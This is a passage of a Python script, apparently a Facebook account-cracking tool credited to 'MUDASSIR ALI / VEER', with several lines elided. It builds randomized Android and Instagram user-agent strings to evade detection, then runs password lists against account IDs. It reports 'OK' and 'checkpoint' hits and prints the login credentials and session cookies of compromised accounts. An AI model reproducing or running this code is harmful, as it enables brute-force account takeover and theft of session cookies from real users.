...
for xd in range(1000):
	...
	c=random.choice(['SM-S908U','SM-S998U','SAMSUNG SM-991U','Pixel 6'])
	v='Build/SP1A.210812.016; wv)'
	...
	uaku=f'{a} {c} {v} {g}{h}.{i}.{j}.{k} {x} {l}'
	ugen.append(uaku)


	aa='Mozilla/5.0 (Linux; Android;'
	b=random.choice(['6.0','7.0','8.1.0','9','10','11','12'])
	c='en-US; Redmi Note 4 Build/MRA58K)'
	g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
	...
	k=random.randrange(40,150)
	x=random.choice(['UCBrowser/12.13.0.1207','OPR/64.3.3282.60839'])
	l='Mobile Safari/537.36 XiaoMi/MiuiBrowser/12.12.1-go'
...
def  ua_zrii():
	...
	babas = {
	    ...
	    "6": f"Instagram {str(rr(100,300))}.0.0.27.120 Android (29/{str(rr(3,10))}; 420dpi; 1080x2186; samsung; SM-A{str(rr(100,999))}F; a{str(rr(15,55))}; exynos{str(rr(1111,9611))}; id_ID; 332901678)"
	}
	return Nazri[str(rr(1,6))]
 ...
 \033[1;37m ##     ##   ########  ########  ########  
  ...
  \033[1;30m ##   ##    ##        ##        ##    ##   
   \033[1;32m ## ##     ##        ##        ##     ##  
    \033[1;34m ###      ########  ########  ##      ##   
\x1b[1;97m------------------------\x1b[1;97m------------------------
\033[1;31m\033[1;37m➣ Author \x1b[1;97m     : \033[1;37m      MUDASSIR ALI
\033[1;31m\033[1;37m➣ Facebook\x1b[1;97m    :  \033[1;37m     VEER KHANOO
\033[1;31m\033[1;37m➣ Version\x1b[1;97m     : \033[1;37m      3.0.7  
\033[1;31m\033[1;37m➣ BEST FRIEND\x1b[1;97m : \033[1;37m     NINA ALI
\033[1;37m------------------------\033[1;37m------------------------ """       
#--------------------[ MASUK ]--------------#
def login():
	try:
...
def passwrd():
	...
	print(47*"-")
	print('\033[1;37m Total  IDs : %s ' % len(id))
	print("\0333[1;37m\r Cracking Started...\033[1;37m")
...
def crack(idf,pwv):
	global loop,ok,cp
	bi = random.choice([P,P,P,P])
	pers = loop*100/len(id2)
	fff = '%'
	prog.update(des,description=f'\033[1;97m[VEER] {(loop)}|{len(id)} [OK:{(ok)}] [CP:{(cp)}]')
	prog.advance(des)
	...
	for pw in pwv:
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				print(f'\r\033[1;31m[VEER-CP] {idf} | {pw} \n')
				...
				coki=po.cookies.get_dict()
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				print(f'\r\033[1;92m[VEER-OK]  {idf} | {pw}          {P}\n└──  Cookie : {hh}{kuki}{P}\n')
